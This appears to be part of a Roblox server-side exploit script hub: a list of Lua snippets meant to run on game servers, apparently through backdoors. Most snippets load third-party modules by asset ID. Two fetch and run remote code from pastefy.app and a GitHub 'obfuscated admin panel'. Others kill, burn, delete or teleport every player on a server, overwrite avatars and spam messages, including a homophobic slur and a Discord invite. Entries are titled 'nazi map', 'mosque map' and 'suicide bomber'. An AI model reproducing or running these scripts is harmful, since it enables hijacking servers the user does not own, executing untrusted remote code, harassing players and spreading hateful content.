	imageOne="http://www.roblox.com/asset/?id=169585459"imageTwo="http://www.roblox.com/asset/?id=169585475"imageThree="http://www.roblox.com/asset/?id=169585485"imageFour="http://www.roblox.com/asset/?id=169585502"imageFive="http://www.roblox.com/asset/?id=169585515"imageSix="http://www.roblox.com/asset/?id=169585502"imageSeven="http://www.roblox.com/asset/?id=169585485"imageEight="http://www.roblox.com/asset/?id=169585475"Spooky=Instance.new("Sound",workspace)Spooky.Name="Spooky"Spooky.SoundId="rbxassetid://174270407"Spooky.Volume=15 Spooky.Looped=true Spooky:Play()Sky=Instance.new("Sky",game.Lighting)Sky.SkyboxBk=imageOne Sky.SkyboxDn=imageOne Sky.SkyboxFt=imageOne Sky.SkyboxLf=imageOne Sky.SkyboxRt=imageOne Sky.SkyboxUp=imageOne while true do Sky.SkyboxBk=imageOne Sky.SkyboxDn=imageOne Sky.SkyboxFt=imageOne Sky.SkyboxLf=imageOne Sky.SkyboxRt=imageOne Sky.SkyboxUp=imageOne t(0.15)Sky.SkyboxBk=imageTwo Sky.SkyboxDn=imageTwo Sky.SkyboxFt=imageTwo Sky.SkyboxLf=imageTwo Sky.SkyboxRt=imageTwo Sky.SkyboxUp=imageTwo t(0.15)Sky.SkyboxBk=imageThree Sky.SkyboxDn=imageThree Sky.SkyboxFt=imageThree Sky.SkyboxLf=imageThree Sky.SkyboxRt=imageThree Sky.SkyboxUp=imageThree t(0.15)Sky.SkyboxBk=imageFour Sky.SkyboxDn=imageFour Sky.SkyboxFt=imageFour Sky.SkyboxLf=imageFour Sky.SkyboxRt=imageFour Sky.SkyboxUp=imageFour t(0.15)Sky.SkyboxBk=imageFive Sky.SkyboxDn=imageFive Sky.SkyboxFt=imageFive Sky.SkyboxLf=imageFive Sky.SkyboxRt=imageFive Sky.SkyboxUp=imageFive t(0.15)Sky.SkyboxBk=imageSix Sky.SkyboxDn=imageSix Sky.SkyboxFt=imageSix Sky.SkyboxLf=imageSix Sky.SkyboxRt=imageSix Sky.SkyboxUp=imageSix t(0.15)Sky.SkyboxBk=imageSeven Sky.SkyboxDn=imageSeven Sky.SkyboxFt=imageSeven Sky.SkyboxLf=imageSeven Sky.SkyboxRt=imageSeven Sky.SkyboxUp=imageSeven t(0.15)Sky.SkyboxBk=imageEight Sky.SkyboxDn=imageEight Sky.SkyboxFt=imageEight Sky.SkyboxLf=imageEight Sky.SkyboxRt=imageEight Sky.SkyboxUp=imageEight t(0.15)end
]], "CS / SS")

cscript("char all c00lunable", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7618879506"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all unable", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "3087640584"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all noxious", [[
		for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7277426403"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("char all c00lkidd", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "8101069571"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("send all to the gate", [[
	local TeleportService = game:GetService("TeleportService")
	local Players = game:GetService("Players")

	for _, player in ipairs(Players:GetPlayers()) do
 	   if player and player:IsA("Player") then
  	        TeleportService:Teleport(109758127685691, player)
  	     end
	end
]], "CS / SS")

cscript("creepy lighting", [[
	local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.new(1,0,0)
]], "CS / SS")

cscript("grab knife v3", [[
	require(2829943043):Run(game:GetService("Players").%replace%with%username%.Name,'i baked you a pie')
]], "RQ")

cscript("message", [[
local function write(text, object)
	if object:IsA("Message") == true then
		local count = object:FindFirstChild("Count")
		if count == nil then
			count = Instance.new("NumberValue")
			count.Parent = object
			count.Name = "Count"
			count.Value = count.Value + 1
		else
			count.Value = count.Value + 1
		end
		local startcount = count.Value
		for i = 1, #text do
			if count.Value == startcount then
				local letter = string.sub(text, i, i)
				object.Text = string.sub(text, 1, i)
				t(0)
			else
				break
			end
		end

		t(1)
		if count.Value == startcount then
			for i = #text, 1, -1 do
				if count.Value == startcount then
					object.Text = string.sub(text, 1, i - 1)
					t(0)
				else
					break
				end
			end
			if count.Value == startcount then
				object:Destroy()
			end
		end
	end
end
local bro = Instance.new("Message",workspace)
bro.Name = "dontdeleteme"
write("WE ARE SO BACK. | gg/bwdk8vAy8n", bro)
]], "CS / SS")

cscript("create baseplate", [[
	baseplate = Instance.new("Part")
	baseplate.Name = "Baseplate"
	baseplate.Size = Vector3.new(2048, 16, 2048)
	baseplate.Anchored = true
	baseplate.Position = Vector3.new(0, 0, 0)
	baseplate.BrickColor = BrickColor.new("Dark grey metallic")
	baseplate.Material = Enum.Material.Plastic
	baseplate.Parent = workspace
		
	txt = Instance.new("Texture")
	txt.Texture = "rbxassetid://6372755229"
	txt.Parent = baseplate
]], "CS / SS")

cscript("polaria", [[
	require(123255432303221):Pload("%replace%with%username%")
]], "RQ")

cscript("polaria", [[
	loadstring(game:HttpGet("https://pastefy.app/agqEB2qs/raw",true))()
]], "LS")

cscript("nazi map", [[
	require(139666139485072).load("%replace%with%username%")
]], "RQ")

cscript("suicide pistol", [[
	require(3023538289).load("%replace%with%username%")
]], "RQ")

cscript("tornado", [[
	require(16178147710).load("%replace%with%username%")
]], "RQ")

cscript("helicopter", [[
	require(9230060018).RAroblox("%replace%with%username%")
]], "RQ")

cscript("infinite yield bytecode", [[
	require(13716575182)("%replace%with%username%")
]], "RQ")

cscript("suicide bomber v2", [[
	require(0x49731b7f).load("%replace%with%username%")
]], "RQ")

cscript("mosque map", [[
	require(131945008071397).map("%replace%with%username%")
]], "RQ")

cscript("steve", [[
local player = game:GetService("Players"):FindFirstChild("%replace%with%username%")
if player then
    local character = player.Character or player:WaitForChild("Character")
    
    for _, v in pairs(character:GetChildren()) do
        if v:IsA("Accessory") then
            v:Destroy()
        end
    end
end
require(15581949972).mc("%replace%with%username%")
]], "RQ")

cscript("spawn noobs", [[
	require(5193737424)("%replace%with%username%", false)
]], "RQ")

cscript("NDS", [[
	require(14704225060).nds("%replace%with%username%")
]], "RQ")

cscript("doge army", [[
	require(5115249013).fehack("%replace%with%username%")
]], "RQ")

cscript("c4", [[
	require(0x1767bf813)("%replace%with%username%")
]], "RQ")

cscript("alif gunman", [[
	require(96378053590566).gunman("%replace%with%username%")
]], "RQ")

cscript("retester ST", [[
	require(136379675730375).verybig("%replace%with%username%")
]], "RQ")

cscript("T0PK3K V5.3", [[
	require(0x342D5F0DA)("%replace%with%username%")
]], "RQ")

cscript("T0PK3K V3", [[
	require(2609384717).load("%replace%with%username%")
]], "RQ")

cscript("uzi", [[
	require(4746064028).load("%replace%with%username%")
]], "RQ")

cscript("excavator", [[
	require(16999802471)("%replace%with%username%")
]], "RQ")

cscript("patrick's wraith", [[
	require(12102103065).Patrick("%replace%with%username%")
]], "RQ")

cscript("insulting message", [[
    local hint = Instance.new("Hint")
    hint.Text = "stop using c00lgui and / or other bullshit guis and focus more on not making / executing scripts that plaster your faggy avatar all over the map, you literal zygotes. "
    hint.Parent = workspace
    hint.Name = "dontdeleteme"

    local message = "stop using c00lgui and / or other bullshit guis and focus more on not making / executing scripts that plaster your faggy avatar all over the map, you literal zygotes. "
    local scrollIndex = 1

    while true do
        local shiftedMessage = message:sub(scrollIndex) .. message:sub(1, scrollIndex - 1)
        hint.Text = shiftedMessage
        t(0.1)
        scrollIndex = scrollIndex + 1
        if scrollIndex > #message then
            scrollIndex = 1
        end
    end
]], "CS / SS")

cscript("KFC map", [[
	require(3615713971).load()
]], "RQ")

cscript("stummy guns", [[
	require(14671740203)("%replace%with%username%", "Guns")
]], "RQ")

cscript("bow v2", [[
	require(4560072580).load("%replace%with%username%")
]], "RQ")

cscript("server admin", [[
	require(4665394711).load("%replace%with%username%")
]], "RQ")

cscript("server admin", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/server%20admin.lua"))()
]], "LS")

cscript("chara", [[
	require(5845670816).load("%replace%with%username%")
]], "RQ")

cscript("soul reaper", [[
	require(7972086233).CLoad("%replace%with%username%")
]], "RQ")

cscript("sledge hammer", [[
	require(8038037940).CLoad("%replace%with%username%")
]], "RQ")

cscript("chrona", [[
	require(4661847142).load("%replace%with%username%")
]], "RQ")

cscript("neptunian V", [[
	require(4661705712).load("%replace%with%username%")
]], "RQ")

cscript("sadist", [[
	require(4665990665).load("%replace%with%username%")
]], "RQ")

cscript("bangang", [[
	require(4659214877).Lunar("%replace%with%username%")
]], "RQ")

cscript("xester", [[
	require(2918747265).load("%replace%with%username%")
]], "RQ")

cscript("cyclone message", [[
    local hint = Instance.new("Hint")
    hint.Text = "I'VE BEEN WAITING FOR THE SAVE... "
    hint.Name = "dontdeleteme"
    hint.Parent = workspace

    local message = "I'VE BEEN WAITING FOR THE SAVE... "
    local scrollIndex = 1

    while true do
        local shiftedMessage = message:sub(scrollIndex) .. message:sub(1, scrollIndex - 1)
        hint.Text = shiftedMessage
        t(0.1)
        scrollIndex = scrollIndex + 1
        if scrollIndex > #message then
            scrollIndex = 1
        end
    end
]], "CS / SS")

cscript("SSP", [[
	require(16920033857)("%replace%with%username%")
]], "RQ")

cscript("trash hub", [[
	require(17182254638)("%replace%with%username%")
]], "RQ")

cscript("stratosphere", [[
	require(6535776034).load("%replace%with%username%")
]], "RQ")

cscript("sheldoni", [[
	require(15629007042)("%replace%with%username%")
]], "RQ")

cscript("blast ss", [[
	require(5596373023).load(plr.Name)
]], "RQ")

cscript("mouse.avi map", [[
	require(9974938026).map()
]], "RQ")

cscript("shake baseplate", [[
		local myBaseplate = game.Workspace.Baseplate 

	while true do
		myBaseplate.Orientation = Vector3.new(0.1,0,0.1)
		t()
		myBaseplate.Orientation = Vector3.new(0.3,0,0.3)
		t()
		myBaseplate.Orientation = Vector3.new(0.5,0,0.5)
		t()
		myBaseplate.Orientation = Vector3.new(0.7,0,0.7)
		t()
		myBaseplate.Orientation = Vector3.new(0.9,0,0.9)
		t()
		myBaseplate.Orientation = Vector3.new(1.1,0,1.1)
		t()
		myBaseplate.Orientation = Vector3.new(1.3,0,1.3)
		t()
		myBaseplate.Orientation = Vector3.new(1.5,0,1.5)
		t()
		myBaseplate.Orientation = Vector3.new(1.7,0,1.7)
		t()
		myBaseplate.Orientation = Vector3.new(1.9,0,1.9)
		t()
		myBaseplate.Orientation = Vector3.new(2.1,0,2.1)
		t()
		myBaseplate.Orientation = Vector3.new(2.3,0,2.3)
		t()
		myBaseplate.Orientation = Vector3.new(2.5,0,2.5)
		t()
		myBaseplate.Orientation = Vector3.new(2.7,0,2.7)
		t()
		myBaseplate.Orientation = Vector3.new(2.9,0,2.9)
		t()
		myBaseplate.Orientation = Vector3.new(3.1,0,3.1)
		t()
		myBaseplate.Orientation = Vector3.new(3.3,0,3.3)
		t()
		myBaseplate.Orientation = Vector3.new(3.5,0,3.5)
		t()
		myBaseplate.Orientation = Vector3.new(3,7,0,3.7)
		t()
		myBaseplate.Orientation = Vector3.new(3.9,0,3.9)
		t()
		myBaseplate.Orientation = Vector3.new(4.1,0,4.1)
		t()
		myBaseplate.Orientation = Vector3.new(4.3,0,4.3)
		t()
		myBaseplate.Orientation = Vector3.new(4.5,0,4.5)
		t()
		myBaseplate.Orientation = Vector3.new(4.7,0,4.7)
		t()
		myBaseplate.Orientation = Vector3.new(4.9,0,4.9)
		t()
		myBaseplate.Orientation = Vector3.new(4.7,0,4.7)
		t()
		myBaseplate.Orientation = Vector3.new(4.5,0,4.5)
		t()
		myBaseplate.Orientation = Vector3.new(4.3,0,4.3)
		t()
		myBaseplate.Orientation = Vector3.new(4.1,0,4.1)
		t()
		myBaseplate.Orientation = Vector3.new(3.9,0,3.9)
		t()
		myBaseplate.Orientation = Vector3.new(3.7,0,3.7)
		t()
		myBaseplate.Orientation = Vector3.new(3.5,0,3.5)
		t()
		myBaseplate.Orientation = Vector3.new(3.3,0,3.3)
		t()
		myBaseplate.Orientation = Vector3.new(3.1,0,3.1)
		t()
		myBaseplate.Orientation = Vector3.new(2.9,0,2.9)
		t()
		myBaseplate.Orientation = Vector3.new(2.7,0,2.7)
		t()
		myBaseplate.Orientation = Vector3.new(2.5,0,2.5)
		t()
		myBaseplate.Orientation = Vector3.new(2.3,0,2.3)
		t()
		myBaseplate.Orientation = Vector3.new(2.1,0,2.1)
		t()
		myBaseplate.Orientation = Vector3.new(1.9,0,1.9)
		t()
		myBaseplate.Orientation = Vector3.new(1.7,0,1.7)
		t()
		myBaseplate.Orientation = Vector3.new(1.5,0,1.5)
		t()
		myBaseplate.Orientation = Vector3.new(1.3,0,1.3)
		t()
		myBaseplate.Orientation = Vector3.new(1.1,0,1.1)
		t()
		myBaseplate.Orientation = Vector3.new(0.9,0,0.9)
		t()
		myBaseplate.Orientation = Vector3.new(0.7,0,0.7)
		t()
		myBaseplate.Orientation = Vector3.new(0.5,0,0.5)
		t()
		myBaseplate.Orientation = Vector3.new(0.3,0,0.3)
		t()
		myBaseplate.Orientation = Vector3.new(0.1,0,0.1)
		t()
	end
]], "CS / SS")

cscript("blurple lighting", [[
    local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.fromHex("4051ED")
]], "CS / SS")

cscript("nullioner", [[
	require(7972181516).CLoad("%replace%with%username%")
]], "RQ")

cscript("crawl", [[
	require(7972019185).CLoad("%replace%with%username%")
]], "RQ")

cscript("the sun is a deadly laser", [[
	require(4528360948):Fire("%replace%with%username%", "hack")
]], "RQ")

cscript("delinquent", [[
	require(1525600089).goldentec("%replace%with%username%")
]], "RQ")

cscript("the alchemist", [[
	require(6224178099).load("%replace%with%username%")
]], "RQ")

cscript("killing machine", [[
	require(6375409514).load("%replace%with%username%")
]], "RQ")

cscript("hololive fubiki", [[
	require(5907637844).load("%replace%with%username%")
]], "RQ")

cscript("dimensiona", [[
	require(4957540270).load("%replace%with%username%")
]], "RQ")

cscript("fiery switcher", [[
	require(5748722400).eliza("%replace%with%username%")
]], "RQ")

cscript("split head", [[
	require(5760009753).load("%replace%with%username%")
]], "RQ")

cscript("killbot", [[
	require(6688474792).load("%replace%with%username%")
]], "RQ")

cscript("fight mode", [[
	require(6438401832).load("%replace%with%username%")
]], "RQ")

cscript("lunatic", [[
	require(5813708464).load("%replace%with%username%")
]], "RQ")

cscript("burn", [[
	require(6478479994).load("%replace%with%username%")
]], "RQ")

cscript("pink barbie car", [[
	require(4745872847).load("%replace%with%username%")
]], "RQ")

cscript("star platinum", [[
	require(5534238329)("%replace%with%username%", "StarPlatinum")
]], "RQ")

cscript("archangel", [[
	require(2972034986):Fire("%replace%with%username%", "test")
]], "RQ")

cscript("blind reaper", [[
	require(4665382251).load("%replace%with%username%")
]], "RQ")

cscript("felipe ascension", [[
	require(5339034667):Start("%replace%with%username%", "AAA")
]], "RQ")

cscript("big glock thing", [[
	require(2959952198):Fire("%replace%with%username%", "test")
]], "RQ")

cscript("chainsaw", [[
	require(4560014954).load("%replace%with%username%")
]], "RQ")

cscript("john wick", [[
	require(4721853215):Fire("%replace%with%username%")
]], "RQ")

cscript("wpxne tools", [[
	require(9971661842):wpnxe("%replace%with%username%")
]], "RQ")

cscript("clear sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("clear labeled sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name == "dontdeleteme" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("clear unlabeled sounds", [[
	for _, sound in pairs(game:GetDescendants()) do
		if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
			sound:Destroy()
		end
	end
]], "CS / SS")

cscript("self destruct", [[
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local debounce = false

local function createExplosion(position)
	local outerSphere = Instance.new("Part")
	outerSphere.Shape = Enum.PartType.Ball
	outerSphere.Size = Vector3.new(1, 1, 1)
	outerSphere.Anchored = true
	outerSphere.CanCollide = false
	outerSphere.Material = Enum.Material.Neon
	outerSphere.Color = Color3.fromHex("4051ED")
	outerSphere.Transparency = 0.2
	outerSphere.CFrame = CFrame.new(position)
	outerSphere.Name = "ExplosionSphere"
	outerSphere.Parent = workspace

	local innerSphere = Instance.new("Part")
	innerSphere.Shape = Enum.PartType.Ball
	innerSphere.Size = Vector3.new(0.85, 0.85, 0.85)
	innerSphere.Anchored = true
	innerSphere.CanCollide = false
	innerSphere.Material = Enum.Material.Neon
	innerSphere.Color = Color3.new(1, 1, 1)
	innerSphere.Transparency = 0.6
	innerSphere.CFrame = CFrame.new(position)
	innerSphere.Parent = outerSphere

	local touchedParts = {}

	local function affectObject(hit)
		if touchedParts[hit] then return end
		touchedParts[hit] = true

		local model = hit:FindFirstAncestorOfClass("Model")
		local hum = model and model:FindFirstChildWhichIsA("Humanoid")

		if hum and hum.Health > 0 and model ~= player.Character then
			hum.Health = 0
		end
	end

	outerSphere.Touched:Connect(affectObject)
	innerSphere.Touched:Connect(affectObject)

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			local distance = (obj.Position - position).Magnitude
			if distance <= 10 then
				affectObject(obj)
			end
		end
	end

	local boom = Instance.new("Sound")
	boom.SoundId = "rbxassetid://128993426058979"
	boom.Volume = 5
	boom.TimePosition = 0.2
	boom.PlayOnRemove = true
	boom.Parent = outerSphere
	boom:Destroy()

	local boom2 = Instance.new("Sound")
	boom2.SoundId = "rbxassetid://9057675920"
	boom2.Volume = 10
	boom2.TimePosition = 0.5
	boom2.PlayOnRemove = true
	boom2.Parent = outerSphere
	boom2:Destroy()

	task.spawn(function()
		local totalTime = 4
		local start = tick()
		while tick() - start < totalTime do
			local progress = (tick() - start) / totalTime
			local size = 1 + (180 - 1) * progress
			local transparency = 0.2 + (1 - 0.2) * progress
			local innerTransparency = 0.6 + (1 - 0.6) * progress

			outerSphere.Size = Vector3.new(size, size, size)
			innerSphere.Size = Vector3.new(size * 0.95, size * 0.95, size * 0.95)

			outerSphere.Transparency = transparency
			innerSphere.Transparency = innerTransparency

			outerSphere.CFrame = CFrame.new(position)
			innerSphere.CFrame = CFrame.new(position)

			RunService.RenderStepped:Wait()
		end
		outerSphere:Destroy()
	end)
end

local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:FindFirstChild("HumanoidRootPart")
local hum = character:FindFirstChildWhichIsA("Humanoid")

for _, part in ipairs(character:GetDescendants()) do
	if part:IsA("BasePart") or part:IsA("Decal") then
		part.Transparency = 1
	end
	if part:IsA("BasePart") then
		part.Anchored = true
	end
end

if hrp then
	createExplosion(hrp.Position)
end

if hum then
	hum.Health = 0
end
]], "CS / SS")

cscript("godmode", [[
local Players = game:GetService("Players")
local player = Players.LocalPlayer

coroutine.wrap(function()
	while true do
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		
		if humanoid then
			humanoid.MaxHealth = 99999
			humanoid.Health = 99999
		end

		if not character:FindFirstChildOfClass("ForceField") then
			local ff = Instance.new("ForceField")
			ff.Visible = false
			ff.Parent = character
		end

		t(0)
	end
end)()
]], "CS / SS")

cscript("set map on fire", [[
local fyecol = Color3.fromHex("4051ED")
local secfyecol = Color3.fromHex("99a3ff")

function fyre(obj)
    if obj:IsA("BasePart") then
        local fye = Instance.new("Fire")
        fye.Size = 10
        fye.Heat = 1
        fye.Color = fyecol
        fye.SecondaryColor = secfyecol
        fye.Parent = obj
    end
end

for _, item in pairs(workspace:GetDescendants()) do
    fyre(item)
end
]], "CS / SS")

cscript("clear players", [[
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

for _, player in pairs(Players:GetPlayers()) do
	if player ~= localPlayer then
		player:Destroy()
	end
end

for _, item in pairs(workspace:GetChildren()) do
	if item:IsA("Model") and Players:GetPlayerFromCharacter(item) and Players:GetPlayerFromCharacter(item) ~= localPlayer then
		item:Destroy()
	end
end
]], "CS / SS")

cscript("clear messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("clear labeled messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name == "dontdeleteme" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name == "dontdeleteme" then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("clear unlabeled messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "dontdeleteme" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "dontdeleteme" then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("billboard psa", [[
local imageId = "rbxassetid://79869170880681"

function billbord(part)
	local existingGui = part:FindFirstChildOfClass("BillboardGui")
	if existingGui then existingGui:Destroy() end

	local billboardGui = Instance.new("BillboardGui")			
	billboardGui.Size = UDim2.new(20, 0, 10, 0)
	billboardGui.AlwaysOnTop = true
	billboardGui.Parent = part
	billboardGui.Adornee = part

	local imageLabel = Instance.new("ImageLabel")			
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Image = imageId
	imageLabel.BackgroundTransparency = 1
	imageLabel.Parent = billboardGui
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbillbord()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			billbord(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			billbord(newDescendant)
		end
	end)
end

addbillbord()
]], "CS / SS")

cscript("self destruct on death", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local function createExplosion(position)
	local outerSphere = Instance.new("Part")
	outerSphere.Shape = Enum.PartType.Ball
	outerSphere.Size = Vector3.new(1, 1, 1)
	outerSphere.Anchored = true
	outerSphere.CanCollide = false
	outerSphere.Material = Enum.Material.Neon
	outerSphere.Color = Color3.fromHex("4051ED")
	outerSphere.Transparency = 0.2
	outerSphere.CFrame = CFrame.new(position)
	outerSphere.Name = "ExplosionSphere"
	outerSphere.Parent = workspace

	local innerSphere = Instance.new("Part")
	innerSphere.Shape = Enum.PartType.Ball
	innerSphere.Size = Vector3.new(0.85, 0.85, 0.85)
	innerSphere.Anchored = true
	innerSphere.CanCollide = false
	innerSphere.Material = Enum.Material.Neon
	innerSphere.Color = Color3.new(1, 1, 1)
	innerSphere.Transparency = 0.6
	innerSphere.CFrame = CFrame.new(position)
	innerSphere.Parent = outerSphere

	local touchedParts = {}

	local function affectObject(hit)
		if touchedParts[hit] then return end
		touchedParts[hit] = true

		local model = hit:FindFirstAncestorOfClass("Model")
		local hum = model and model:FindFirstChildWhichIsA("Humanoid")

		if hum and hum.Health > 0 and model ~= player.Character then
			hum.Health = 0
		end
	end

	outerSphere.Touched:Connect(affectObject)
	innerSphere.Touched:Connect(affectObject)

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			local distance = (obj.Position - position).Magnitude
			if distance <= 10 then
				affectObject(obj)
			end
		end
	end

	local boom = Instance.new("Sound")
	boom.SoundId = "rbxassetid://128993426058979"
	boom.Volume = 5
	boom.TimePosition = 0.2
	boom.PlayOnRemove = true
	boom.Parent = outerSphere
	boom:Destroy()

	local boom2 = Instance.new("Sound")
	boom2.SoundId = "rbxassetid://9057675920"
	boom2.Volume = 10
	boom2.TimePosition = 0.5
	boom2.PlayOnRemove = true
	boom2.Parent = outerSphere
	boom2:Destroy()

	task.spawn(function()
		local totalTime = 4
		local start = tick()
		while tick() - start < totalTime do
			local progress = (tick() - start) / totalTime
			local size = 1 + (180 - 1) * progress
			local transparency = 0.2 + (1 - 0.2) * progress
			local innerTransparency = 0.6 + (1 - 0.6) * progress

			outerSphere.Size = Vector3.new(size, size, size)
			innerSphere.Size = Vector3.new(size * 0.95, size * 0.95, size * 0.95)

			outerSphere.Transparency = transparency
			innerSphere.Transparency = innerTransparency

			outerSphere.CFrame = CFrame.new(position)
			innerSphere.CFrame = CFrame.new(position)

			RunService.RenderStepped:Wait()
		end
		outerSphere:Destroy()
	end)
end

local function onCharacterDeath()
	local character = player.Character
	if character then
		local hrp = character:FindFirstChild("HumanoidRootPart")
		if hrp then
			createExplosion(hrp.Position)
		end
	end
end

local function setupCharacter()
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")

	if humanoid then
		humanoid.Died:Connect(onCharacterDeath)
	end
end

player.CharacterAdded:Connect(setupCharacter)

if player.Character then
	setupCharacter()
end
]], "CS / SS")

cscript("set everyone on fire", [[
local fyecol = Color3.fromHex("4051ED")
local secfyecol = Color3.fromHex("99a3ff")

function fyre(character)
    if character and character:IsA("Model") then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    local fye = Instance.new("Fire")
                    fye.Size = 10
                    fye.Heat = 1
                    fye.Color = fyecol
                    fye.SecondaryColor = secfyecol
                    fye.Parent = part
                end
            end
            
            task.spawn(function()
                while humanoid.Health > 0 do
                    humanoid.Health = humanoid.Health - 20
                    t(0.5)
                end
            end)
        end
    end
end

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Character then
        fyre(player.Character)
    end
end
]], "CS / SS")

cscript("roblox is down!!!", [[
local imageId = "rbxassetid://7866786419"

function billbord(part)
	local existingGui = part:FindFirstChildOfClass("BillboardGui")
	if existingGui then existingGui:Destroy() end

	local billboardGui = Instance.new("BillboardGui")			
	billboardGui.Size = UDim2.new(20, 0, 12, 0)
	billboardGui.AlwaysOnTop = true
	billboardGui.Parent = part
	billboardGui.Adornee = part

	local imageLabel = Instance.new("ImageLabel")			
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Image = imageId
	imageLabel.BackgroundTransparency = 1
	imageLabel.Parent = billboardGui
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbillbord()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			billbord(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			billbord(newDescendant)
		end
	end)
end

addbillbord()
]], "CS / SS")

cscript("tilt baseplate", [[
local baseplate = game.Workspace:FindFirstChild("Baseplate")
if baseplate and baseplate:IsA("BasePart") then
	task.spawn(function()
		for angle = 0, 43, 1 do
			baseplate.Orientation = Vector3.new(angle, 34, 0)
		end
	end)
end
]], "CS / SS")

cscript("darken", [[
	local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.new(0,0,0)
]], "CS / SS")

cscript("reset lighting", [[
	local Lighting = game:GetService("Lighting")
	local Camera = game:GetService("Workspace").CurrentCamera

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or 
				effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("MotionBlurEffect") then
				effect:Destroy()
			end
		end
	end

	local function restoreCameraEffects()
		Camera.FieldOfView = 70
		Camera.CameraSubject = nil
		Camera.CameraType = Enum.CameraType.Custom
		for _, obj in ipairs(Camera:GetChildren()) do
			if obj:IsA("Script") or obj:IsA("LocalScript") then
				obj:Destroy()
			end
		end
	end

	task.spawn(function()
		for property, value in pairs(defaultValues) do
			pcall(function()
				Lighting[property] = value
			end)
		end

		restoreLightingEffects()
		restoreCameraEffects()
	end)
]], "CS / SS")

cscript("thick of it", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubl(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

t(1)

bubl("I'm in the thick of it, everybody knows")

t(3)


bubl("They know me where it snows, I skied in and they froze")

t(3.5)


bubl("I don't know no nothin' 'bout no ice, I'm just cold")

t(3)


bubl("Forty somethin' milli' subs or so, I've been told")

t(3.6)

